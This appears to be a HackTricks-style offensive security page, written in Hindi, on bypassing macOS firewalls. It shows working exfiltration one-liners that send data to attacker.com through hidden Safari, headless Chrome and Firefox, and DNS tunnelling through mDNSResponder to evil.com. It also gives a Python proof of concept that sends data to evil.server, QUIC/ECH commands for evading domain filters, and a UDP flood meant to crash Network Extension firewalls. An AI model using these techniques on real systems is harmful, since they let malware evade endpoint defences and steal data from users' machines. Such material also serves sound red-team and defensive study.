# macOS Firewalls को Bypass करना

{{#include ../../banners/hacktricks-training.md}}

## मिली हुई techniques

निम्न techniques कुछ macOS firewall apps में काम करती हुई पाई गई हैं।

### Whitelist names का दुरुपयोग

- उदाहरण के लिए malware को प्रसिद्ध macOS processes के नामों से चलाना, जैसे **`launchd`**

### Synthetic Click

- यदि firewall user से permission मांगता है, तो malware से **allow पर click** करवाएँ

### **Apple signed binaries का उपयोग करें**

- जैसे **`curl`**, लेकिन **`whois`** जैसे अन्य binaries भी

### प्रसिद्ध Apple domains

Firewall **`apple.com`** या **`icloud.com`** जैसे प्रसिद्ध Apple domains से होने वाले connections को allow कर सकता है। और iCloud का उपयोग C2 के रूप में किया जा सकता है।

### Generic Bypass

Firewalls को bypass करने के लिए कुछ ideas

### Allowed traffic की जाँच करें

Allowed traffic की जानकारी से आपको संभावित whitelisted domains या यह पहचानने में सहायता मिलेगी कि किन applications को उन तक access करने की अनुमति है
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

macOS पर कोई **process** स्वयं DNS server से बात **नहीं** करता। Name resolution को **XPC** के माध्यम से **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) broker करता है, जो Apple-signed system daemon है। इसलिए machine पर होने वाला हर lookup उस process के बजाय **`mDNSResponder` से आने वाले** traffic के रूप में host से बाहर जाता है, जिसने lookup का अनुरोध किया था। Firewalls इसलिए इस daemon पर बिना शर्त भरोसा करते हैं — इसे deny करने से पूरे system का name resolution टूट जाएगा।<sup>[[1]](#references)</sup>

इससे DNS एक ऐसा channel बन जाता है जो firewall द्वारा malware के अपने sockets को block करने पर भी खुला रहता है:<sup>[[1]](#references)</sup>

1. Malware `evil.com` से connect करने का प्रयास करता है। Firewall उसके **अपने** outbound connection की जांच करता है और उसे **block** कर देता है।
2. Malware इसके बजाय XPC के माध्यम से `mDNSResponder` से `evil.com` को **resolve** करने के लिए कहता है।
3. Firewall resulting query की जांच करता है, trusted Apple-signed resolver को originator के रूप में देखता है और उसे **allow** कर देता है।
4. Query DNS server तक पहुंचती है — और यदि attacker `evil.com` के लिए authoritative server चलाता है, तो exchange के दोनों ends उसके नियंत्रण में होते हैं।

क्योंकि attacker उस zone का मालिक है, इसलिए किसी "connection" की कभी आवश्यकता नहीं होती: data को **queried labels** (जैसे `<encoded-chunk>.evil.com`) के अंदर smuggle किया जाता है और commands **answer records** (TXT, A, CNAME…) के अंदर वापस आती हैं। यह पूरी तरह whitelisted process पर चलने वाला classic DNS tunnelling है।

कोई भी unprivileged process daemon को सीधे drive कर सकता है, जो यह पुष्टि करने का आसान तरीका है कि path खुला है:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Browser apps के माध्यम से

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Processes injections के माध्यम से

यदि आप ऐसे **process में code inject** कर सकते हैं जिसे किसी भी server से connect करने की अनुमति है, तो आप firewall protections को bypass कर सकते हैं:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
जुलाई 2024 में Apple ने Safari/WebKit में एक critical bug को patch किया, जिसने Screen Time parental controls द्वारा उपयोग किए जाने वाले system-wide “Web content filter” को निष्प्रभावी कर दिया।
एक specially crafted URI (उदाहरण के लिए, double URL-encoded “://” वाला) Screen Time ACL द्वारा recognise नहीं किया जाता, लेकिन WebKit इसे स्वीकार कर लेता है, इसलिए request unfiltered रूप से बाहर भेज दी जाती है। इस कारण कोई भी process जो URL खोल सकता है (sandboxed या unsigned code सहित), उन domains तक पहुंच सकता है जिन्हें user या MDM profile द्वारा स्पष्ट रूप से block किया गया है।<sup>[[2]](#references)</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### शुरुआती macOS 14 “Sonoma” में Packet Filter (PF) rule-ordering bug
macOS 14 के beta cycle के दौरान Apple ने **`pfctl`** के userspace wrapper में एक regression पेश किया।
`quick` keyword के साथ जोड़े गए rules (जिनका उपयोग कई VPN kill-switches करते हैं) को चुपचाप अनदेखा कर दिया गया, जिससे VPN/firewall GUI द्वारा *blocked* रिपोर्ट किए जाने पर भी traffic leaks हो गए। इस bug की पुष्टि कई VPN vendors ने की और इसे RC 2 (build 23A344) में ठीक कर दिया गया।

त्वरित leak-जांच:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple-signed helper services का दुरुपयोग (legacy – pre-macOS 11.2)
macOS 11.2 से पहले **`ContentFilterExclusionList`** लगभग 50 Apple binaries, जैसे **`nsurlsessiond`** और App Store, को Network Extension framework से लागू किए गए सभी socket-filter firewalls (LuLu, Little Snitch, आदि) को bypass करने की अनुमति देता था।
Malware आसानी से किसी excluded process को spawn कर सकता था—या उसमें code inject कर सकता था—और पहले से allowed socket के माध्यम से अपने traffic को tunnel कर सकता था। Apple ने macOS 11.2 में exclusion list को पूरी तरह हटा दिया, लेकिन उन systems पर यह technique अभी भी relevant है जिन्हें upgrade नहीं किया जा सकता।<sup>[[3]](#references)</sup>

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH से Network Extension domain filters को evade करना (macOS 12+)
NEFilter Packet/Data Providers, TLS ClientHello SNI/ALPN पर निर्भर करते हैं। **HTTP/3 over QUIC (UDP/443)** और **Encrypted Client Hello (ECH)** के साथ SNI encrypted रहता है, NetExt flow को parse नहीं कर सकता, और hostname rules अक्सर fail-open हो जाते हैं, जिससे malware DNS को छुए बिना blocked domains तक पहुंच सकता है।<sup>[[5]](#references)</sup>

न्यूनतम PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
यदि QUIC/ECH अभी भी enabled है, तो यह hostname-filter evasion का एक आसान path है।

### macOS 15 “Sequoia” Network Extension instability (2024–2025)
शुरुआती 15.0/15.1 builds third-party **Network Extension** filters (LuLu, Little&nbsp;Snitch, Defender, SentinelOne, आदि) को crash कर देते हैं। जब filter restart होता है, macOS अपने flow rules हटा देता है और कई products fail-open हो जाते हैं। हजारों short UDP flows से filter को flood करना (या QUIC/ECH force करना) crash को बार-बार trigger कर सकता है और C2/exfil के लिए एक window छोड़ सकता है, जबकि GUI अभी भी firewall के running होने का दावा करता है।<sup>[[4]](#references)</sup>

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## आधुनिक macOS के लिए Tooling tips

1. GUI firewalls द्वारा generate किए गए वर्तमान PF rules का निरीक्षण करें:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. उन binaries की सूची बनाएं जिनके पास पहले से *outgoing-network* entitlement है (piggy-backing के लिए उपयोगी):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift में अपना Network Extension content filter programmatically register करें।
एक minimal rootless PoC, जो packets को local socket पर forward करता है, Patrick Wardle के **LuLu** source code में उपलब्ध है।

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
